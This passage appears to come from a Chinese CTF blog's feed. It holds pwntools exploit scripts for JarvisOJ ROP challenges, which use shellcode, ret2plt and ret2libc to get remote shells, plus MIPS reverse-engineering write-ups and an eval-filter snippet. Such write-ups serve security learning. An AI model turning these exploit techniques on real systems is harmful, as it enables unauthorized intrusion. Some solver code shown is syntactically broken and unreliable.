class="string">"None"</span>)</span><br><span class="line">    expression = expression.replace(<span class="string">'__import__(\'os\').system(\'find ~\')'</span>,<span class="string">'None'</span>)</span><br><span class="line">    print(expression)</span><br><span class="line">    buf = <span class="string">''</span></span><br><span class="line">    buf += str(eval(expression))</span><br><span class="line">    buf += <span class="string">'\n'</span></span><br><span class="line">    s.send(buf.encode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>入门笔记</title>
      <link href="/%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="ROP（X86）"><a href="#ROP（X86）" class="headerlink" title="ROP（X86）"></a>ROP（X86）</h1><ul><li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level1</li><li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level2</li><li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level3</li><li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level4</li><li style="list-style: none"><input type="checkbox" checked> 国赛技能赛华东区线下赛 pwn12</li></ul><a id="more"></a><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><blockquote><p>待施工…</p></blockquote><h2 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h2><h3 id="JarvisOJ-level1"><a href="#JarvisOJ-level1" class="headerlink" title="JarvisOJ level1"></a>JarvisOJ level1</h3><p>发现问题函数</p><img src="/入门笔记/1531318071045.png" title="x86_level1"><p>计算得到会溢出的位数为0x8C，并未发现callsystem之类的函数，需要自己构造shellcode。编写攻击代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9877'</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">get_addr = r.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">addr = int(get_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode+<span class="string">'A'</span>*(<span class="number">0x8c</span>-len(shellcode))+p32(addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="JarvisOJ-level2"><a href="#JarvisOJ-level2" class="headerlink" title="JarvisOJ level2"></a>JarvisOJ level2</h3><p>该程序中存在System函数和‘/bin/sh’字符串，直接调用它们，在x86中函数的参数是直接通过栈来传递的，第一个参数是ebp+0x8，在构造payload的时候注意参数的配置。并且由于延迟绑定技术，.plt段中的内容是实现跳转操作的代码片段，所以system函数的地址可以通过查看plt表获得。综上，得到如下exp函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line"></span><br><span class="line">level2 = ELF(<span class="string">'level2'</span>)</span><br><span class="line">system_addr = level2.plt[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment">#system_addr = 0x8048320</span></span><br><span class="line">ret = <span class="string">'a'</span>*<span class="number">4</span></span><br><span class="line">bin_addr = <span class="number">0x804A024</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x8c</span> + p32(system_addr) + ret + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="JarvisOJ-level3"><a href="#JarvisOJ-level3" class="headerlink" title="JarvisOJ level3"></a>JarvisOJ level3</h3><p>程序中没有直接给出system函数和’/bin/sh’字符串，但是.so文件中有我们需要的函数和字符串。并且这个程序调用过write函数，我们知道由于延迟绑定技术，可执行文件中的.got和.plt中的地址并不是目标地址，而是动态连接器中的地址。在程序执行的第一次调用时，动态链接器才把got表和plt表中的地址填写正确。所以我们要泄露出write函数的地址，再结合偏移地址和内存地址的关系计算出system函数和’/bin/sh’的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line">level3 = ELF(<span class="string">'level3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = level3.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = level3.got[<span class="string">'write'</span>]</span><br><span class="line">ret = <span class="number">0x804844B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x8c</span> + p32(write_plt) + p32(ret) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">write_libc = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh_libc = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">system_addr = write_addr-write_libc+system_libc</span><br><span class="line">sh_addr = write_addr-write_libc+sh_libc</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">0x8c</span> + p32(system_addr) + <span class="string">"aaaa"</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="JarvisOJ-level4"><a href="#JarvisOJ-level4" class="headerlink" title="JarvisOJ level4"></a>JarvisOJ level4</h3><p>在未能得到程序调用的libc文件的情况下，我们就需要通过泄露内存的手段来获取libc中某函数的地址，然后通过版本对比得到其它函数或字符串的偏移量达到调用system(‘/bin/sh’)的目的。</p><p>这道题目并没有给出libc文件，首先通过payload1调用write函数输出libc中某个函数得实际地址，在下面代码中使用得write函数。然后通过LibcSearcher得到对应libc得版本号，从而获得system函数和”/bin/sh”字符串的相对地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = hex(u32(p.recv(<span class="number">4</span>)))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">offset_system = obj.dump(<span class="string">"system"</span>)</span><br><span class="line">offset_binsh = obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">offset_write = obj.dump(<span class="string">"write"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - offset_write + offset_system</span><br><span class="line">binsh_addr = write_addr - offset_write + offset_binsh</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(system_addr) + <span class="string">"aaaa"</span> + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="国赛技能赛华东区线下赛-pwn12"><a href="#国赛技能赛华东区线下赛-pwn12" class="headerlink" title="国赛技能赛华东区线下赛 pwn12"></a>国赛技能赛华东区线下赛 pwn12</h3><p>foo函数里，在gets函数后有一个puts输入内容的函数，要先接收puts的内容才能获得puts的内存地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">foo_addr = <span class="number">0x0804859F</span></span><br><span class="line">plt_puts = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">got_puts = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x20</span> + p32(plt_puts) + p32(foo_addr) +p32(got_puts)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(p32(got_puts) + <span class="string">'\x0a'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">offset_system = obj.dump(<span class="string">"system"</span>)</span><br><span class="line">offset_puts = obj.dump(<span class="string">"puts"</span>)</span><br><span class="line">offset_sh = obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = puts_addr - offset_puts + offset_system</span><br><span class="line">sh_addr = puts_addr - offset_puts + offset_sh</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x20</span> +p32(system_addr) + p32(foo_addr) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(p32(sh_addr) + <span class="string">'\x0a'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​     </p>]]></content>
      
      <categories>
          
          <category> Binary security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MIPS合集</title>
      <link href="/MIPS%E5%90%88%E9%9B%86/"/>
      <url>/MIPS%E5%90%88%E9%9B%86/</url>
      <content type="html"><![CDATA[<h1 id="MIPS合集"><a href="#MIPS合集" class="headerlink" title="MIPS合集"></a>MIPS合集</h1><ul><li style="list-style: none"><input type="checkbox" checked> DDCTF2018 baby_mips</li><li style="list-style: none"><input type="checkbox" checked> SUCTF2018 babyre</li><li style="list-style: none"><input type="checkbox" checked> QCTF2018 Xman_mips</li></ul><a id="more"></a><h2 id="MIPS简介"><a href="#MIPS简介" class="headerlink" title="MIPS简介"></a>MIPS简介</h2><blockquote><p>待施工</p></blockquote><h2 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h2><blockquote><p>待施工</p></blockquote><img src="/MIPS合集/1531364168593.png" title="test"><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="DDCTF2018-baby-mips"><a href="#DDCTF2018-baby-mips" class="headerlink" title="DDCTF2018 baby_mips"></a>DDCTF2018 baby_mips</h3><pre><code>这道题目的解题思路比较常规，通过调试发现花指令并修改，然后分析它的算法得出最终解。重在了解MIPS指令集，并且熟悉MIPS的反编译工具jeb或者retdec。</code></pre><ul><li><p>前期准备</p><pre><code>在Ubuntu上看到该程序是一个mips32位的程序，无法直接执行，所以在Linux上搭建一个qemu运行这个程序。</code></pre></li><li><p>修改花指令</p><pre><code>用qemu+jeb动态调试代码，要注意这个baby_mips是小端序，执行时不能直接qemu-mips。</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel baby_mips //执行baby_mips</span><br><span class="line">qemu-mipsel -g 2359 baby_mips//监听2359端口</span><br></pre></td></tr></table></figure><pre><code>用IDA开动态调试，观察发生段错误的指令，‘\xEB02’开头，往后面翻可以看到很多无法解析的二进制也有’\xEB02‘，‘\xEB’在x86指令集中指的是”jmp 后面的两个字节是偏移“，‘\xEB02’就是指向后跳转两字节。mips指令集是一个定长指令集，大小为四字节，我们可以大胆的猜测，‘\xEB02’就是一个简单的花指令，于是编写代码去花。下面是去花用的python代码</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f = open(<span class="string">"baby_mips"</span>,<span class="string">"rb"</span>)</span><br><span class="line">content = f.read()</span><br><span class="line">f.close()</span><br><span class="line">content = list(content)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(content)):</span><br><span class="line"><span class="keyword">if</span> content[x] == <span class="string">"\xeb"</span> <span class="keyword">and</span> content[x+<span class="number">1</span>] == <span class="string">"\x02"</span> <span class="keyword">and</span> (x%<span class="number">4</span>==<span class="number">0</span>):</span><br><span class="line">content[x] = <span class="string">"\x00"</span></span><br><span class="line">content[x+<span class="number">1</span>] = <span class="string">"\x00"</span></span><br><span class="line">content[x+<span class="number">2</span>] = <span class="string">"\x00"</span></span><br><span class="line">content[x+<span class="number">3</span>] = <span class="string">"\x00"</span></span><br><span class="line">content = <span class="string">""</span>.join(content)</span><br><span class="line">p = open(<span class="string">"patch"</span>,<span class="string">"wb"</span>)</span><br><span class="line">p.write(content)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure></li><li><p>分析算法得解</p><pre><code>用IDA插件retdec反编译去花后的程序，是一个16元一次方程。</code></pre><img src="/MIPS合集/1531382477663.png" title="babymips_1"><pre><code>然后编写一个python脚本解方程组，</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.linalg <span class="keyword">import</span> solve</span><br><span class="line">A=[</span><br><span class="line">  [<span class="number">-15858</span>,<span class="number">-48466</span>,<span class="number">32599</span>,<span class="number">38605</span>,<span class="number">-44159</span>,<span class="number">23939</span>,<span class="number">45662</span>,<span class="number">9287</span>,<span class="number">47754</span>,<span class="number">47937</span>,<span class="number">41896</span>,<span class="number">51986</span>,<span class="number">-26968</span>,<span class="number">22561</span>,<span class="number">30701</span>,<span class="number">63487</span>],</span><br><span class="line">  [<span class="number">60228</span>,<span class="number">-3993</span>,<span class="number">-16615</span>,<span class="number">57134</span>,<span class="number">-19246</span>,<span class="number">-38581</span>,<span class="number">40294</span>,<span class="number">-44968</span>,<span class="number">-28198</span>,<span class="number">-58965</span>,<span class="number">-39534</span>,<span class="number">22458</span>,<span class="number">-8828</span>,<span class="number">48593</span>,<span class="number">46135</span>,<span class="number">23871</span>],</span><br><span class="line">  [<span class="number">59121</span>,<span class="number">42162</span>,<span class="number">-65140</span>,<span class="number">-3847</span>,<span class="number">-23842</span>,<span class="number">-47173</span>,<span class="number">-39252</span>,<span class="number">37804</span>,<span class="number">-20964</span>,<span class="number">-19217</span>,<span class="number">56467</span>,<span class="number">5112</span>,<span class="number">9324</span>,<span class="number">61729</span>,<span class="number">61599</span>,<span class="number">3578</span>],</span><br><span class="line">  [<span class="number">-36731</span>,<span class="number">-26147</span>,<span class="number">1670</span>,<span class="number">19245</span>,<span class="number">26847</span>,<span class="number">39911</span>,<span class="number">8628</span>,<span class="number">57946</span>,<span class="number">-51207</span>,<span class="number">63125</span>,<span class="number">-21537</span>,<span class="number">-9321</span>,<span class="number">40745</span>,<span class="number">-58129</span>,<span class="number">30962</span>,<span class="number">-27610</span>],</span><br><span class="line">  [<span class="number">-63560</span>,<span class="number">-53320</span>,<span class="number">-34289</span>,<span class="number">61060</span>,<span class="number">-14289</span>,<span class="number">46922</span>,<span class="number">53218</span>,<span class="number">36638</span>,<span class="number">-61969</span>,<span class="number">-33727</span>,<span class="number">-4681</span>,<span class="number">32423</span>,<span class="number">-17044</span>,<span class="number">-46689</span>,<span class="number">-35443</span>,<span class="number">-24156</span>],</span><br><span class="line">  [<span class="number">-10571</span>,<span class="number">-11103</span>,<span class="number">51585</span>,<span class="number">-24771</span>,<span class="number">63730</span>,<span class="number">57047</span>,<span class="number">-63227</span>,<span class="number">4227</span>,<span class="number">-56470</span>,<span class="number">-22654</span>,<span class="number">-46325</span>,<span class="number">62842</span>,<span class="number">22480</span>,<span class="number">59412</span>,<span class="number">24937</span>,<span class="number">62085</span>],</span><br><span class="line">  [<span class="number">52617</span>,<span class="number">-54333</span>,<span class="number">61495</span>,<span class="number">33704</span>,<span class="number">-41733</span>,<span class="number">-44527</span>,<span class="number">51882</span>,<span class="number">-61765</span>,<span class="number">-24691</span>,<span class="number">-10103</span>,<span class="number">31055</span>,<span class="number">61454</span>,<span class="number">-59349</span>,<span class="number">9812</span>,<span class="number">-48848</span>,<span class="number">-47279</span>],</span><br><span class="line">  [<span class="number">-40696</span>,<span class="number">-26470</span>,<span class="number">54670</span>,<span class="number">-23715</span>,<span class="number">10008</span>,<span class="number">7723</span>,<span class="number">-62622</span>,<span class="number">53112</span>,<span class="number">31753</span>,<span class="number">-5047</span>,<span class="number">-48878</span>,<span class="number">-58448</span>,<span class="number">19875</span>,<span class="number">-34944</span>,<span class="number">-22161</span>,<span class="number">35800</span>],</span><br><span class="line">  [<span class="number">-23196</span>,<span class="number">-43354</span>,<span class="number">-58947</span>,<span class="number">3384</span>,<span class="number">-2426</span>,<span class="number">-60194</span>,<span class="number">51907</span>,<span class="number">-20177</span>,<span class="number">-31882</span>,<span class="number">61703</span>,<span class="number">42398</span>,<span class="number">-4627</span>,<span class="number">45749</span>,<span class="number">-29203</span>,<span class="number">-11139</span>,<span class="number">-41301</span>],</span><br><span class="line">  [<span class="number">-37819</span>,<span class="number">-10066</span>,<span class="number">-48579</span>,<span class="number">-62613</span>,<span class="number">-28961</span>,<span class="number">40001</span>,<span class="number">-37989</span>,<span class="number">-27875</span>,<span class="number">-20264</span>,<span class="number">-33616</span>,<span class="number">-5998</span>,<span class="number">30740</span>,<span class="number">-29594</span>,<span class="number">21652</span>,<span class="number">5165</span>,<span class="number">51797</span>],</span><br><span class="line">  [<span class="number">52993</span>,<span class="number">62328</span>,<span class="number">4196</span>,<span class="number">-55719</span>,<span class="number">-1917</span>,<span class="number">28075</span>,<span class="number">-44831</span>,<span class="number">-15799</span>,<span class="number">13652</span>,<span class="number">-52110</span>,<span class="number">-38933</span>,<span class="number">62219</span>,<span class="number">40030</span>,<span class="number">-23815</span>,<span class="number">-19505</span>,<span class="number">60128</span>],</span><br><span class="line">  [<span class="number">35796</span>,<span class="number">-28033</span>,<span class="number">-59250</span>,<span class="number">46833</span>,<span class="number">39767</span>,<span class="number">-22909</span>,<span class="number">5585</span>,<span class="number">-42334</span>,<span class="number">64787</span>,<span class="number">6068</span>,<span class="number">60536</span>,<span class="number">-54554</span>,<span class="number">22189</span>,<span class="number">-49945</span>,<span class="number">40846</span>,<span class="number">64023</span>],</span><br><span class="line">  [<span class="number">-18536</span>,<span class="number">-35823</span>,<span class="number">4253</span>,<span class="number">-63956</span>,<span class="number">20175</span>,<span class="number">43158</span>,<span class="number">30523</span>,<span class="number">28298</span>,<span class="number">-29564</span>,<span class="number">18809</span>,<span class="number">50821</span>,<span class="number">-38574</span>,<span class="number">3005</span>,<span class="number">33408</span>,<span class="number">58281</span>,<span class="number">-29452</span>]</span><br><span class="line">  [<span class="number">2848</span>,<span class="number">39836</span>,<span class="number">46250</span>,<span class="number">24950</span>,<span class="number">38512</span>,<span class="number">31901</span>,<span class="number">-21506</span>,<span class="number">-36050</span>,<span class="number">44162</span>,<span class="number">41717</span>,<span class="number">-36605</span>,<span class="number">-26097</span>,<span class="number">-38073</span>,<span class="number">36024</span>,<span class="number">7349</span>,<span class="number">19105</span>],</span><br><span class="line">  [<span class="number">22525</span>,<span class="number">15747</span>,<span class="number">63301</span>,<span class="number">42436</span>,<span class="number">-26106</span>,<span class="number">-22761</span>,<span class="number">48830</span>,<span class="number">6176</span>,<span class="number">-55225</span>,<span class="number">-45599</span>,<span class="number">-30368</span>,<span class="number">50701</span>,<span class="number">5775</span>,<span class="number">10902</span>,<span class="number">12758</span>,<span class="number">-19336</span>],</span><br><span class="line">  [<span class="number">-58450</span>,<span class="number">-51156</span>,<span class="number">-5460</span>,<span class="number">32490</span>,<span class="number">-26701</span>,<span class="number">27355</span>,<span class="number">34100</span>,<span class="number">-14902</span>,<span class="number">10736</span>,<span class="number">54258</span>,<span class="number">-9189</span>,<span class="number">-25920</span>,<span class="number">48339</span>,<span class="number">-61339</span>,<span class="number">61403</span>,<span class="number">-30542</span>]</span><br><span class="line">]</span><br><span class="line">B=[<span class="number">23261386</span>,<span class="number">-1298872</span>,<span class="number">13877344</span>,<span class="number">9172342</span>,<span class="number">-11622989</span>,<span class="number">10343966</span>,<span class="number">-9721165</span>,<span class="number">-8286458</span>,<span class="number">-7515929</span>,<span class="number">-12609498</span>,<span class="number">2179053</span>,<span class="number">11137244</span>,<span class="number">12446496</span>,<span class="number">10255605</span>,<span class="number">854242</span>,<span class="number">1542147</span></span><br><span class="line">a = np.array(A)</span><br><span class="line">b = np.array(B)</span><br><span class="line">x =solve(a,b)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><pre><code>求解python得到解答如下，四舍五入输入程序得到flag</code></pre><img src="/MIPS合集/1530979847276.png" title="babymips_2"><img src="/MIPS合集/1530949463944.png" title="babymips_3"><h3 id="SUCTF2018-babyre"><a href="#SUCTF2018-babyre" class="headerlink" title="SUCTF2018 babyre"></a>SUCTF2018 babyre</h3><ul><li><p>分析代码算法</p><pre><code>我们看到main函数中的主要流程是对输入字符串进行检测，首先经过sub_400780函数进行处理，然后对处理过的字符串进行匹配。sub_400780函数是一个base64编码的函数，它对转换表进行了替换。</code></pre><img src="/MIPS合集/1531379919600.png" title="babyre_1"></li></ul><ul><li><p>编写程序求解</p><pre><code>先把对比字符串数据扣下来，用C代码转换成可见字符串</code></pre></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> arr[] = &#123; <span class="number">101</span>, <span class="number">81</span>, <span class="number">52</span>, <span class="number">121</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">43</span>, <span class="number">86</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">90</span>, <span class="number">122</span>, <span class="number">100</span>, <span class="number">70</span>, <span class="number">78</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">120</span>, <span class="number">48</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">43</span>, <span class="number">121</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">43</span>, <span class="number">74</span>, <span class="number">50</span>, <span class="number">109</span> &#125;;</span><br><span class="line">    <span class="comment">//char arr[] = &#123; 82,57,76,121,54,78,111,74,118,115,73,80,110,87,104,69,84,89,116,72,101,52,83,100,108,43,77,98,71,117,106,97,90,112,107,49,48,50,119,75,67,114,55,47,79,68,103,53,122,88,65,70,113,81,102,120,66,105,99,86,51,109,56,85,0 &#125;;</span></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (arr[i]) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, arr[i]);</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eQ4y46+VufZzdFNFdx0zudsa+yY0+J2m</span><br></pre></td></tr></table></figure><p>把替换字符串数据也扣下来，用如上C代码转换，结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U</span><br></pre></td></tr></table></figure><p>然后用python编写base64的解码代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">my_base64table = <span class="string">"R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/0Dg5zXAFqQfxBicV3m8U"</span></span><br><span class="line">std_base64table =<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">s = <span class="string">"eQ4y46+VufZzdFNFdx0zudsa+yY0+J2m"</span></span><br><span class="line">s = s.translate(string.maketrans(my_base64table,std_base64table))</span><br><span class="line"><span class="keyword">print</span> 